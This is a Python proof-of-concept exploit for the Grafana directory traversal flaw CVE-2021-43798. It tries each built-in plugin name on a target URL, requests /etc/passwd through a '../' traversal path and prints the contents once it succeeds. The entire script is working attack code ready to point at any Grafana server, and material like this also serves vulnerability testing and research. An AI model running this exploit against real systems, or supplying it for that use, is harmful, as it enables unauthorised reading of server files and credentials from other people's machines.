#!/usr/bin/env python3
"""
Grafana Directory Traversal (CVE-2021-43798) PoC
Read arbitrary files via /public/plugins/<plugin>/../../../etc/passwd
"""
import sys
import urllib.request

PLUGINS = [
    'alertlist', 'annolist', 'barchart', 'bargauge', 'candlestick',
    'cloudwatch', 'dashlist', 'elasticsearch', 'gauge', 'geomap',
    'gettingstarted', 'grafana-azure-monitor-datasource', 'graph',
    'heatmap', 'histogram', 'influxdb', 'jaeger', 'logs', 'loki',
    'mysql', 'news', 'nodeGraph', 'opentsdb', 'piechart', 'pluginlist',
    'postgres', 'prometheus', 'stackdriver', 'stat', 'state-timeline',
    'status-history', 'table', 'table-old', 'tempo', 'text',
    'timeseries', 'welcome', 'zipkin',
]

def exploit(target_url: str):
    print(f"[*] Target: {target_url}")
    print(f"[*] CVE-2021-43798 - Grafana Path Traversal")
    print()

    target_file = "../../../../../../../../../etc/passwd"

    for plugin in PLUGINS:
        try:
            url = f"{target_url}/public/plugins/{plugin}/{target_file}"
            req = urllib.request.Request(url, method='GET')
            resp = urllib.request.urlopen(req, timeout=5)
            body = resp.read().decode('utf-8', errors='replace')
            if 'root:' in body:
                print(f"[+] Vulnerable plugin found: {plugin}")
                print(f"[+] /etc/passwd contents:")
                print(body[:2000])
                print()
                print("[+] SUCCESS: Directory traversal confirmed!")
                return
        except urllib.error.HTTPError:
            continue
        except Exception:
            continue

    print("[-] No vulnerable plugin found or target not vulnerable")

if __name__ == '__main__':
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:9035"
    exploit(url)
